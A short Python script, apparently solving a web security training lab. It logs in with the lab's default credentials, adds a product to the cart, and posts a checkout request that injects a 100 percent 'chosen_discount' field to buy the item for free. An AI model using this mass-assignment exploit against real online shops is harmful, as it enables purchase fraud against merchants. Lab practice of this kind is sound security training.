import requests 
from bs4 import BeautifulSoup
import sys
import json



def check_url(raw_url):

    return raw_url.rstrip('/')

def get_csrf_token(url, session):

    response = session.get(url)

    if response.status_code == 200:
        soup = BeautifulSoup(response.text, "html.parser")
        result = soup.find("input", {"name": "csrf"})

        if result:
            print("CSRF Token : " + result["value"])
            return result["value"]
        else:
            print("[!] CSRF token not found!")
            sys.exit(1)            
    
    else:
        print("web request error.")
        sys.exit(1)

def user_login(url, csrf_token, session):

    data = {
        'csrf': csrf_token,
        'username': 'wiener',
        'password': 'peter'
    }

    response = session.post(login_url, data = data, allow_redirects = False)

    if response.status_code == 302 and '/my-account' in response.headers['Location'] :
        print("login successfully.")
    else:
        print("login failed.")
        sys.exit(1)


def add_cart(base_url, session):
    
    add_cart_url = base_url + '/cart'

    data = {
        "productId": "1",
	    "redir": "PRODUCT",
	    "quantity": "1"
    }

    response = session.post(add_cart_url, data = data, allow_redirects = False)

    if response.status_code == 302 and "/product?productId=1" in response.headers["Location"]:
        print("Add product to cart successfully.")
    else:
        print("Add product to cart failed.")
        sys.exit(1)


def do_checkout(base_url, session):

    check_url = base_url + '/api/checkout'

    data = {
        "chosen_discount": {"percentage":100},
        "chosen_products": [{"product_id":"1","quantity":1}]
    }

    json_data = json.dumps(data)

    response = session.post(check_url, data = json_data, allow_redirects = False)

    if response.status_code == 201 and "/cart/order-confirmation?order-confirmed=true" in response.headers["Location"]:
        print("Product purchase successfully.")

    else:
        print("Product purchase failed.")
        sys.exit(1)


session = requests.Session()

args = sys.argv[1:]
base_url = check_url(args[0])

login_url = base_url + '/login'

csrf_token = get_csrf_token(login_url, session)
user_login(login_url, csrf_token, session)
add_cart(base_url, session)
do_checkout(base_url, session)

